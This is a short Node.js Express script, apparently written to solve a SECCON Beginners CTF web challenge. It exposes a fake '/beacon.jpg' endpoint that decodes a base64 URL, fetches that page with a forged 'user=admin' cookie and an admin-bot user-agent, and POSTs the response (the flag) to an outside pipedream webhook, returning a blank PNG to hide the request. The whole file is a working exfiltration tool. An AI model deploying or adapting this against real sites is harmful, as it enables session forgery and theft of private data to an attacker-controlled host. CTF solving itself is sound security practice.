import express from 'express';
import fetch from 'node-fetch';
import { Buffer } from 'buffer';

const app = express();
const PORT = process.env.PORT || 8080;

const WEBHOOK_URL = 'https://eoa0a3qqgsiiqb4.m.pipedream.net';

// base64でURLをパスとして渡す形式
app.get('/beacon.jpg/:b64url', async (req, res) => {
  try {
    let target = Buffer.from(req.params.b64url, 'base64').toString();

    // 127.0.0.1やlocalhostを外部アクセス可能なFQDNに置換
    target = target
      .replace('127.0.0.1:50000', 'memo4b.challenges.beginners.seccon.jp:50000')
      .replace('localhost:50000', 'memo4b.challenges.beginners.seccon.jp:50000');

    const urlObj = new URL(target);
    const flagRes = await fetch(target, {
      headers: {
        cookie: 'user=admin',
        Host: urlObj.host,
        'User-Agent': 'Mozilla/5.0 (compatible; AdminBot/1.0)',
      }
    });

    const flagText = await flagRes.text();

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: flagText,
      headers: { 'Content-Type': 'text/plain' }
    });

    const transparentGif = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADElEQVR42mP8z/C/HwAFAgH/YOEGiQAAAABJRU5ErkJggg==',
      'base64'
    );

    res.setHeader('Content-Type', 'image/png');
    res.send(transparentGif);
  } catch (err) {
    console.error('[beacon-path] error:', err);
    res.status(500).send('error');
  }
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
});
